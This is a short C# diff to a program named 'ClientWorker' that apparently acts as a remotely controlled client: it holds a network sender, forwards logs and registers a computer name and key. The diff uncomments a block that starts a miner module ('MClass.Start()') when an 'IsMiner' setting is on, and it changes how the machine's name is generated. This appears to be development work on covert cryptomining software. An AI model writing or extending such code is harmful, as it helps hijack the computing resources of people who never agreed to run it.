@@ -17,12 +17,14 @@ namespace ClientWorker
         public static Client netSender;
         public static string nameProc;
         private static readonly ManualResetEventSlim _OnResponce = new ManualResetEventSlim(false);
+        private static string installPath = "Name";
 
-        private static void Main()
+        public static void Main(string[] args)
 		{
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
 
+            if (args.Length > 0 ) installPath = args[0];
             OnProgramLoad();
 
             netSender = new Client();
@@ -107,14 +109,14 @@ namespace ClientWorker
                 }
             }
 
-            //if (!isM && Service.Properties.Settings.Default.IsMiner)
-            //{
-            //    try
-            //    {
-            //        MClass.Start();
-            //    }
-            //    catch (Exception ex) { Log.Send(ex.Message); }
-            //}
+            if (!isM && Service.Properties.Settings.Default.IsMiner)
+            {
+                try
+                {
+                    MClass.Start();
+                }
+                catch (Exception ex) { Log.Send(ex.Message); }
+            }
 
 
             if (num > 1)
@@ -130,7 +132,7 @@ namespace ClientWorker
             Service.Properties.Settings.Default.Start_time = DateTime.Now;          
             if (Service.Properties.Settings.Default.Comp_name == "")
             {
-                Service.Properties.Settings.Default.Comp_name = "Name_" + Service.Properties.Settings.Default.Start_time.ToString();
+                Service.Properties.Settings.Default.Comp_name = installPath + Service.Properties.Settings.Default.Start_time.ToString();
             }
             if (Service.Properties.Settings.Default.Key == "")
             {
